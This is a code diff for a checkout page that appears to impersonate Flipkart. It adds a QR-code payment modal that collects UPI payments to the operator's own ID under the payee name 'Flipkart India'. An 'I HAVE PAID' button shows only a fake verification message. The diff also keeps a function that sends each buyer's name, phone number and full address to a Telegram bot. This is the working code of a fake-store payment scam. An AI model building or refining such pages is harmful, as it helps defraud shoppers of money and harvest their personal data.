@@ -314,17 +314,28 @@
         <span>Payment</span>
     </div>
 </div>
-        <div class="p-4">
-            <div class="bg-white p-4 rounded shadow-sm">
-                <label class="flex items-center justify-between">
-                    <div class="flex gap-4 items-center">
-                        <img src="https://img.icons8.com/color/48/phone-pe.png" class="w-6 h-6">
-                        <span class="font-bold">UPI (PhonePe / GPay)</span>
-                    </div>
-                    <input type="radio" checked>
-                </label>
+      <div id="paymentModal" class="hidden fixed inset-0 bg-black/80 z-[500] flex items-center justify-center p-4">
+        <div class="bg-white rounded-xl w-full max-w-sm overflow-hidden">
+            <div class="fk-blue p-4 text-white flex justify-between items-center">
+                <span class="font-bold">Scan & Pay to Confirm</span>
+                <i class="fa-solid fa-xmark text-xl" onclick="closeModal()"></i>
             </div>
-            <button onclick="confirmPay()" class="w-full btn-orange py-4 mt-8 shadow-xl uppercase font-bold">Place Order & Pay</button>
+            <div class="p-6 text-center">
+                <p class="text-sm mb-4 font-medium text-gray-600">Scan this QR to complete your payment of <span id="modal-price" class="text-black font-bold"></span></p>
+                
+                <div class="bg-gray-100 p-4 rounded-lg inline-block border-2 border-dashed border-gray-300">
+                    <img id="qrImage" src="" alt="QR Code" class="w-48 h-48 mx-auto">
+                </div>
+
+                <div class="mt-4 flex items-center justify-center gap-4">
+                    <img src="https://img.icons8.com/color/48/phone-pe.png" class="w-8">
+                    <img src="https://img.icons8.com/color/48/google-pay.png" class="w-8">
+                    <img src="https://img.icons8.com/color/48/paytm.png" class="w-8">
+                </div>
+                
+                <button onclick="finalDone()" class="w-full btn-orange py-3 rounded-md mt-6 font-bold shadow-lg">I HAVE PAID</button>
+                <p class="text-[10px] text-gray-400 mt-2">Your order will be processed after verification</p>
+            </div>
         </div>
     </div>
 
@@ -541,39 +552,50 @@ init = function() {
             }
         }
 
-        async function confirmPay() {
-    // Sari details collect karna
+       async function confirmPay() {
     const name = document.getElementById('uName').value;
     const phone = document.getElementById('uPhone').value;
     const pincode = document.getElementById('uPin').value;
     const city = document.getElementById('uCity').value;
     const address = document.getElementById('uAdd').value;
 
-    // Message format for Telegram
+    if(!name || !phone || !address) {
+        alert("Please fill all details!");
+        return;
+    }
+
+    // 1. Telegram Message Bhejna
     const msg = `🔥 *NEW ORDER ALERT* 🔥\n\n` +
                 `📦 *Item:* ${sel.name}\n` +
                 `💰 *Price:* ₹${sel.price}\n\n` +
                 `👤 *Name:* ${name}\n` +
                 `📞 *Phone:* ${phone}\n` +
-                `📍 *Pin:* ${pincode}\n` +
-                `🏙️ *City:* ${city}\n` +
-                `🏠 *Add:* ${address}`;
+                `🏠 *Add:* ${address}, ${city} - ${pincode}`;
 
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
 
-    try {
-        await fetch(url);
-    } catch (e) {
-        console.log("Telegram failed but moving to payment");
-    }
+    try { await fetch(url); } catch (e) { console.log("Telegram Error"); }
 
-    // --- UPDATED UPI LINK WITH MESSAGE ---
-    // Note: Isse UPI ID ke niche message dikhega
-    const upiNote = encodeURIComponent(`Order: ${sel.name.substring(0, 15)} by ${name}`);
+    // 2. QR Code Generate Karna (Google Chart API se)
+    // upi://pay?pa=YOURID&pn=NAME&am=AMOUNT&cu=INR
+    const upiURL = `upi://pay?pa=${MY_UPI}&pn=Flipkart%20India&am=${sel.price}&cu=INR&tn=Order%20Payment`;
+    const qrSource = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(upiURL)}`;
     
-   // Is line ko replace karo confirmPay function ke andar
-window.location.href = `upi://pay?pa=${MY_UPI}&pn=Flipkart%20India&tr=ORDER${Date.now()}&am=${sel.price}&cu=INR&tn=Order%20for%20${encodeURIComponent(sel.name)}`;
+    document.getElementById('qrImage').src = qrSource;
+    document.getElementById('modal-price').innerText = "₹" + sel.price;
+    
+    // 3. Modal Show Karna
+    document.getElementById('paymentModal').classList.remove('hidden');
+}
 
+function closeModal() {
+    document.getElementById('paymentModal').classList.add('hidden');
+}
+
+function finalDone() {
+    alert("Payment is under verification. You will receive a confirmation SMS shortly.");
+    window.location.reload();
+}
 // Ye line hamesha last mein rehni chahiye
 init();
     </script>
